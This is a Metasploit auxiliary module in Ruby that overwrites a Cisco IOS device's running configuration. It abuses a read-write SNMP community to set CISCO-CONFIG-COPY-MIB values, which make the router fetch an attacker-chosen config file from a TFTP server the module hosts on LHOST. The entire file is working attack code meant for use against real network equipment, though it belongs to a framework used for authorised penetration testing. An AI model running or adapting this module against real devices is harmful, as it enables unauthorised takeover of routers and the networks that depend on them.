##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cisco IOS SNMP Config Upload (TFTP)',
      'Description' => %q{
          This module will override the running config of a Cisco IOS Device with the
          config file that you specify. A read-write SNMP community is required. The SNMP community 
          scanner module can assist in identifying a read-write community. The 
          target must be able to connect back to the Metasploit system and the 
          use of NAT will cause the TFTP transfer to fail.
        },
      'Author'      =>
        [
          'ct5595'
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptPath.new('SOURCE', [true, "The filename to upload" ]),
      OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ])
    ])
  end

  #
  # Start the TFTP Server
  #
  def setup

    @path     = datastore['SOURCE']
    @filename = @path.split(/[\/\\]/)[-1] #/

    # Setup is called only once
    print_status("Starting TFTP server...")
    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })

    # Register our file name and data
    ::File.open(@path, "rb") do |fd|
      buff = fd.read(fd.stat.size)
      @tftp.register_file(@filename, buff)
    end

    @tftp.start
    add_socket(@tftp.sock)

    @main_thread = ::Thread.current

  end

  #
  # Kill the TFTP server
  #
  def cleanup
    # Cleanup is called once for every single thread
    if ::Thread.current == @main_thread
      # Wait 5 seconds for background transfers to complete
      print_status("Providing some time for transfers to complete...")
      ::IO.select(nil, nil, nil, 5.0)

      print_status("Shutting down the TFTP service...")
      if @tftp
        @tftp.close rescue nil
        @tftp = nil
      end
    end
  end

  def run_host(ip)

    begin
      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)

      ccCopyProtocol = "1.3.6.1.4.1.9.9.96.1.1.1.1.2."
      ccCopySourceFileType = "1.3.6.1.4.1.9.9.96.1.1.1.1.3."
      ccCopyDestFileType  = "1.3.6.1.4.1.9.9.96.1.1.1.1.4."
      ccCopyServerAddress = "1.3.6.1.4.1.9.9.96.1.1.1.1.5."
      ccCopyFileName = "1.3.6.1.4.1.9.9.96.1.1.1.1.6."
      ccCopyEntryRowStatus = "1.3.6.1.4.1.9.9.96.1.1.1.1.14."

      session = rand(255) + 1

      snmp = connect_snmp

      print_status("Copying file #{@filename} to #{ip}...")

      varbind = SNMP::VarBind.new("#{ccCopyProtocol}#{session}" , SNMP::Integer.new(1))
      value = snmp.set(varbind)
      
      varbind = SNMP::VarBind.new("#{ccCopySourceFileType}#{session}" , SNMP::Integer.new(1))
      value = snmp.set(varbind)
      
      varbind = SNMP::VarBind.new("#{ccCopyDestFileType}#{session}" , SNMP::Integer.new(4))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ccCopyServerAddress}#{session}", SNMP::IpAddress.new(lhost))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ccCopyFileName}#{session}", SNMP::OctetString.new(@filename))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ccCopyEntryRowStatus}#{session}" , SNMP::Integer.new(1))
      value = snmp.set(varbind)



    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end
end
